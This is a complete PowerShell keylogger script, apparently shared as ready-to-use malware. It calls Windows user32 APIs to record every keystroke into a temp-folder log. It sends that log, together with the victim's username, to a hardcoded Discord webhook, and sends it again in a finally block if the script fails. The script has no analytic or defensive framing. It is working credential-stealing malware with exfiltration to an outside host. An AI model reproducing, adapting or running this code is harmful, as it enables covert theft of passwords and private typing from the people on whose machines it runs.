# powershell keylogger
# created by : Computeroid

# webhook, CHANGE ME
$webhook = "https://discord.com/api/webhooks/1131616138724380742/aIQoUMIk75emzz4q-vRPolrO-gPqL8ou1Kk8kf-fx44SvEj-Ls3t9lORrh8Po-La2mQ2"

# write pid
$PID > "$env:temp/DdBPKCytRe"

# keylogger
function KeyLogger($logFile="$env:temp/$env:UserName.log") {

  # webhook process
  $logs = Get-Content $logFile | Out-String
  $Body = @{
    'username' = $env:UserName
    'content' = $logs
  }

  # Check if $logs is not empty before making the webhook request

  $jsonBody = $Body | ConvertTo-Json
  Write-Host "Sending JSON Payload: $logs"
  Invoke-RestMethod -Uri $webhook -Method 'post' -Body ($Body | ConvertTo-Json) -ContentType 'Application/Json' -ErrorAction SilentlyContinue


  # generate log file
  $generateLog = New-Item -Path $logFile -ItemType File -Force

  # API signatures
  $APIsignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

 # set up API
 $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru

 # Create a hashtable mapping the virtual key codes to their names.
 $keyMap = @{
    8 = "<DEL>"
    9 = "<TAB>"
    13 = "<ENTER>"
    16 = "<SHIFT>"
    17 = "<CTRL>"
    18 = "<ALT>"
    91 = "<WIN>"
    255 = "<NULL>"
 }

  # attempt to log keystrokes
  try {
    while ($true) {
      # Start-Sleep -Milliseconds 40

      for ($ascii = 1; $ascii -le 255; $ascii++) {

        # use API to get key state
        $keystate = $API::GetAsyncKeyState($ascii)

        # use API to detect keystroke
        if ($keystate -eq -32767) {
          $null = [console]::CapsLock

          # map virtual key
          $mapKey = $API::MapVirtualKey($ascii, 3)

          # check if it's a known non-text key
          if ($keyMap.ContainsKey($ascii)) {
            [System.IO.File]::AppendAllText($logFile, $keyMap[$ascii], [System.Text.Encoding]::Unicode)
          }
          else {
            # create a stringbuilder
            $keyboardState = New-Object Byte[] 256
            $hideKeyboardState = $API::GetKeyboardState($keyboardState)
            $loggedchar = New-Object -TypeName System.Text.StringBuilder

            # translate virtual key
            if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
              # add logged key to file
              [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode)
            }
          }
        }
      }
    }
  }

  # send logs if code fails
  finally {
    # send logs via webhook
    Invoke-RestMethod -Uri $webhook -Method 'post' -Body ($Body | ConvertTo-Json) -ContentType 'Application/Json' -ErrorAction SilentlyContinue
  }
}

# run keylogger
KeyLogger